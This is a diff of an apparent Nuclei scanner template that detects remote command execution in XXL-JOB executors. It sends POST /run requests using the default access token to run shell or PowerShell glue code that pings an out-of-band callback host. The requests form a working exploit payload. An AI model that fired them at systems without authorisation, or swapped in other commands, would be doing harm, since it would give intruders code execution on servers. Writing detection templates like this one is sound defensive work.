@@ -16,39 +16,65 @@ info:
     verified: true
   tags: xxl-job
 
-variables:
-  dns: "{{interactsh-url}}"
-  cmd: "ping {{dns}}"
-
-http:
+requests:
   - raw:
+        # linux
       - |
         POST /run HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
-        Connection: close
-        Content-Length: 422
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
         Content-Type: application/json
-        XXL-JOB-ACCESS-TOKEN: default_token
-        Accept-Encoding: gzip
+        Xxl-Job-Access-Token: default_token
+        Content-Length: 396
 
         {
-          "jobId": 187270,
+          "jobId": {{rand_int(1000)}},
           "executorHandler": "demoJobHandler",
           "executorParams": "demoJobHandler",
           "executorBlockStrategy": "COVER_EARLY",
           "executorTimeout": 0,
-          "logId": 187270,
-          "logDateTime": 116989791110,
+          "logId": 1,
+          "logDateTime": 1586629003729,
           "glueType": "GLUE_SHELL",
-          "glueSource": "curl {{dns}}",
-          "glueUpdatetime": 116989791110,
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+        
+      # win
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+        Content-Type: application/json
+        Xxl-Job-Access-Token: default_token
+        Content-Length: 396
+
+        {
+          "jobId": {{rand_int(1000)}},
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_POWERSHELL",
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
           "broadcastIndex": 0,
           "broadcastTotal": 0
         }
 
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - contains(interactsh_protocol, "dns")
-        condition: and
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
